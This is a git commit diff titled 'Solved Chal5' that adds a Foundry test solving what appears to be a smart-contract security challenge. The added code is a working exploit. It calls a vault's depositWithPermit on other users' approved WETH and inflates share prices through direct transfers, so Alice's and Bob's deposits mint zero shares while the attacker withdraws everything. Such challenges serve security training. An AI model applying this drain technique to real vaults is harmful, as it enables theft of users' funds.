e8918891c7e294d3ce72cbec43ca6286ecb4f04b
J4X <y.buchrieser@gmail.com>
2023-07-18 19:44:50 +0200

    Solved Chal5

--- test/Challenge5.t.sol
+++ test/Challenge5.t.sol
@@ -50,8 +50,50 @@ contract Challenge5Test is Test {
         // forge test --match-contract Challenge5Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        //
+        //vault.depositWithPermit(bob, 500 ether, block.number + 100, 0, 0, 0);
+
+        //First we change our eth to weth
+        weth.deposit{value: 10 ether}();
+
+        //Then we approve the vault to spend our weth
+        //NOTE: This would make the attacker vulnerable to the same attack. 
+        weth.approve(address(vault), type(uint256).max);
+
+        //Tracker of our balance
+        uint256 currentAttackerBalance = weth.balanceOf(address(attacker));
+
+        //Now we loop until we have more weth than Alice
+        while(currentAttackerBalance < weth.balanceOf(address(alice)))
+        {
+            //Deposit 1 weth to get 1 share
+            vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
+
+            //Transfer all our money to the vault
+            weth.transfer(address(vault), currentAttackerBalance-1);
+
+            //Let Alice deposit but due to the division, she gets 0 shares
+            vault.depositWithPermit(alice, currentAttackerBalance-1, block.number + 100, 0, 0, 0);
+
+            //Now we withdraw our 1 share which is all the money in the vault
+            vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));
+
+            //Update the balance
+            currentAttackerBalance = weth.balanceOf(address(attacker));
+        }
+
+        //Now we empty the rest of Alice's account, we do the same as above
+        vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
+        weth.transfer(address(vault), weth.balanceOf(address(alice)));
+        vault.depositWithPermit(alice, weth.balanceOf(address(alice)), block.number + 100, 0, 0, 0);
+        vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));
 
 
+        //As we have the funds now, Bob is super easy to drain, we do the same as above
+        vault.depositWithPermit(address(attacker), 1, block.number + 100, 0, 0, 0);
+        weth.transfer(address(vault), weth.balanceOf(address(bob)));
+        vault.depositWithPermit(bob, weth.balanceOf(address(bob)), block.number + 100, 0, 0, 0);
+        vault.withdraw(vault.maxWithdraw(attacker), address(attacker), address(attacker));
 
         //==================================================//
         vm.stopPrank();
